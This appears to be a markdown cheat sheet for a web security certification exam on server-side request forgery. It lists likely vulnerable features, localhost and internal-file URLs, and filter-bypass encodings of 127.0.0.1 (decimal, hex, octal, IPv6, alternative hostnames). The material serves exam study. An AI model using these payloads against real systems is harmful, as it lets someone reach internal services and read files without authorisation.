## 🎯 Target Locations

1. **Product Stock Check** (`/product/stock`) ⭐⭐⭐
2. **Admin Panel** - "Download report as PDF" feature
3. **IMPORTANT**: An **absolute URL** in a get or post request might allow for SSRF. (Cookies may affect if it is allowed or not)

## ⚠️ CRITICAL EXAM TIP

**On the exam, SSRF can access an internal-only service:**
- **Host:** `localhost` or `127.0.0.1`
- **Port:** `6566`
- **Purpose:** Read files from the system

**Example:**
```
http://localhost:6566/home/carlos/secret
```

## 🔥 Basic SSRF Payloads

### Access Internal Services
```
http://localhost/admin
http://127.0.0.1/admin
http://192.168.0.1/admin
```

### Access Internal File Service (Exam)
```
http://localhost:6566/home/carlos/secret
http://127.0.0.1:6566/home/carlos/secret
```

## 🛡️ Bypass Techniques

### IP Address Encoding

#### Decimal Encoding
```
http://2130706433/admin
```
(127.0.0.1 = 2130706433 in decimal)

#### Hex Encoding
```
http://0x7f.0x0.0x0.0x1/admin
http://0x7f000001/admin
```

#### Octal Encoding
```
http://0177.0.0.01/admin
```

#### Mixed Encoding
```
http://0177.0.0.0x1/admin
```

---

### Blacklist Bypass

#### Alternative Localhost Representations
```
127.1
127.0.1
localhost
localtest.me
```

#### IPv6
```
http://[::1]/admin
http://[::ffff:127.0.0.1]/admin
```

## 🎓 Exam Tips

1. **Check stock check functionality** - Most common SSRF location
2. **Try port 6566 on localhost** - Exam-specific internal service
3. **Use IP encoding** - Bypass blacklists
4. **Look for admin panel PDF features** - SSRF via HTML injection

---
